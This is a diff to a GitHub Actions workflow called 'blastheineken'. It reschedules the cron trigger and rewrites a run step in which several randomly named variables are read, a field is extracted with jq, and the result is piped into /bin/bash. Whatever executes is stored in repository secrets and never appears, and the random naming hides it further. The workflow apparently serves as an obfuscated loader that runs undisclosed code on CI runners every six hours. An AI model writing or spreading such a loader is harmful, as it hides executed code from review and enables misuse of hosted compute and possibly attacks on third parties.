@@ -1,9 +1,9 @@
 name: blastheineken
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 4/6 * * *'
+    - cron: '56 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: blastheineken
         env:
-          io1: ${{ secrets.io1 }}
+          ir1: ${{ secrets.ir1 }}
         run: |
-          echo $io1 | jq -r .gsv11 | /bin/bash
-          echo $owo6438 | jq -r .k959 | /bin/bash
-          echo $gvl4200 | jq -r .ifaa84062 | /bin/bash
-          echo $lg13 | jq -r .j3 | /bin/bash
-          echo $oiu6983 | jq -r .jc7 | /bin/bash
-          echo $cl8 | jq -r .ra35894 | /bin/bash
-          echo $hrb1390 | jq -r .jhr94403 | /bin/bash
+          echo $ir1 | jq -r .lvel21538 | /bin/bash
+          echo $sq03004 | jq -r .erdoy8 | /bin/bash
+          echo $sw81031 | jq -r .qo58 | /bin/bash
+          echo $dzi2200 | jq -r .uki52 | /bin/bash
+          echo $yf8494 | jq -r .bw5397 | /bin/bash
+          echo $zcpn730 | jq -r .decmh8 | /bin/bash
+          echo $nz70 | jq -r .wb66 | /bin/bash
+          echo $ev02 | jq -r .g1938 | /bin/bash
+          echo $bub0 | jq -r .o33050 | /bin/bash
 
